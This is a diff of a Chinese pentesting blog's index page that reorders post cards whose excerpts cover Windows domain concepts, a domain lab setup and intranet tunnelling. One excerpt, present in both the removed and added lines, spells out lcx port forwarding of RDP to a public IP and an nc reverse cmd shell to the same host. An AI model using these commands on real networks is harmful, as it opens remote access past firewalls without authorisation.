@@ -149,21 +149,73 @@
     
     
     <div class="col-12 col-md-12 mx-auto index-info">
-      <a href="/2019/10/25/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%A6%82%E5%BF%B5/">
-        <p class="h4 index-header">域渗透-概念</p>
+      <a href="/2019/12/27/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/">
+        <p class="h4 index-header">内网穿透</p>
       </a>
 
-      <a href="/2019/10/25/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%A6%82%E5%BF%B5/">
+      <a href="/2019/12/27/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/">
         
         
           
         
         <div class="index-excerpt" >
-          <div class="index-text mb-1">域渗透-概念0x00 前言初次了解域渗透，并不是很了解域的概念，并不清楚域的一些功用。因此记录一些前置的知识和自己的理解
-0x01 工作组工作组是局域网中的一个概念，由若干同一地点、同一网络的用户组成的小组。
-工作组中的计算机是对等的，即访问每台电脑需要用对应电脑的账户登陆，才能获取资源。
-0x02 域域–Domain，windows网络中独立运行的单位，域之间相互访问需要建立信任关系。信任是域与域之间的桥梁。两个域之间建立了信任关系，则可以跨域管理、实现跨域网络资源共享、相互通信与数据传输。
-域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Wind</div>
+          <div class="index-text mb-1">lcx情景：本地内网主机：A公网主机：B目标内网主机：C
+C可以访问公网，不能被公网访问
+命令：C：lcx.exe -slave 47.101.36.165 7777 127.0.0.1 3389B：lcx.exe -listen 7777 8888
+此时，可以主机A可以通过访问公网IP加端口8888来连接内网主机C的3389
+nc情景：本地内网主机：A公网主机：B目标内网主机：C
+C可以访问公网，不能被公网访问
+命令：B：nc -lvvp 8888C：nc -t -e cmd 47.101.36.165 8888
+此时，公网主机B能收到内网主机C的反弹cmd
+ew情景1：本地内网主机：A公网</div>
+        </div>
+      </a>
+
+      <div class="index-btm">
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-12-27&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/">内网穿透</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <div class="col-12 col-md-12 mx-auto index-info">
+      <a href="/2019/10/25/%E5%9F%9F%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+        <p class="h4 index-header">域渗透-环境搭建</p>
+      </a>
+
+      <a href="/2019/10/25/%E5%9F%9F%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">前言最近受大佬启发，觉得需要往内网方向有所了解。于是开始学习内网渗透。但是苦于没有什么现成的环境，只能够自己手动搭建。
+准备Windows server 2012 1台、Windows 7 2台、vmware
+网络环境windows server 2012（DC）: 域控服务器
+IP：10.16.11.21
+windows 7（DM）: 配备两张网卡，一张通物理机，一张通域内网
+IP：10.16.11.22，192.168.100.196
+windows 7（DM）: 一张网卡，通域内网
+IP：10.16.11.23
+域控架设配置IP与DNS首先要配置静态IP，在网络和共享中心里进行配置
+
+配</div>
         </div>
       </a>
 
@@ -172,6 +224,16 @@
           <i class="iconfont icon-riqi2"></i>&nbsp;2019-10-25&nbsp;&nbsp;
         
         
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a>&nbsp;
+          
         
       </div>
     </div>
@@ -181,25 +243,21 @@
     
     
     <div class="col-12 col-md-12 mx-auto index-info">
-      <a href="/2019/10/24/%E5%9F%9F%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
-        <p class="h4 index-header">域渗透-环境搭建</p>
+      <a href="/2019/10/24/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%A6%82%E5%BF%B5/">
+        <p class="h4 index-header">域渗透-概念</p>
       </a>
 
-      <a href="/2019/10/24/%E5%9F%9F%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+      <a href="/2019/10/24/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%A6%82%E5%BF%B5/">
         
         
           
         
         <div class="index-excerpt" >
-          <div class="index-text mb-1">域渗透-环境搭建0x00 前言最近受大佬启发，觉得需要往内网方向有所了解。于是开始学习内网渗透。但是苦于没有什么现成的环境，只能够自己手动搭建。
-0x01 准备Windows server 2012 1台、Windows 7 2台、vmware
-0x02 网络环境windows server 2012（DC）: 域控服务器
-IP：10.16.11.21
-windows 7（DM）: 配备两张网卡，一张通物理机，一张通域内网
-IP：10.16.11.22，192.168.100.196
-windows 7（DM）: 一张网卡，通域内网
-IP：10.16.11.23
-0x03 域控架设配置IP与D</div>
+          <div class="index-text mb-1">前言初次了解域渗透，并不是很了解域的概念，并不清楚域的一些功用。因此记录一些前置的知识和自己的理解
+工作组工作组是局域网中的一个概念，由若干同一地点、同一网络的用户组成的小组。
+工作组中的计算机是对等的，即访问每台电脑需要用对应电脑的账户登陆，才能获取资源。
+域域–Domain，windows网络中独立运行的单位，域之间相互访问需要建立信任关系。信任是域与域之间的桥梁。两个域之间建立了信任关系，则可以跨域管理、实现跨域网络资源共享、相互通信与数据传输。
+域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管</div>
         </div>
       </a>
 
@@ -208,42 +266,16 @@ IP：10.16.11.23
           <i class="iconfont icon-riqi2"></i>&nbsp;2019-10-24&nbsp;&nbsp;
         
         
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <div class="col-12 col-md-12 mx-auto index-info">
-      <a href="/2019/04/23/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/">
-        <p class="h4 index-header">内网穿透</p>
-      </a>
-
-      <a href="/2019/04/23/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/">
-        
-        
+          <i class="iconfont icon-inbox"></i>
           
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">内网穿透lcx情景：本地内网主机：A公网主机：B目标内网主机：C
-C可以访问公网，不能被公网访问
-命令：C：lcx.exe -slave 47.101.36.165 7777 127.0.0.1 3389B：lcx.exe -listen 7777 8888
-此时，可以主机A可以通过访问公网IP加端口8888来连接内网主机C的3389
-nc情景：本地内网主机：A公网主机：B目标内网主机：C
-C可以访问公网，不能被公网访问
-命令：B：nc -lvvp 8888C：nc -t -e cmd 47.101.36.165 8888
-此时，公网主机B能收到内网主机C的反弹cmd
-ew情景1：本地内网主机</div>
-        </div>
-      </a>
-
-      <div class="index-btm">
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-04-23&nbsp;&nbsp;
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>&nbsp;
+          &nbsp;
         
         
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a>&nbsp;
+          
         
       </div>
     </div>
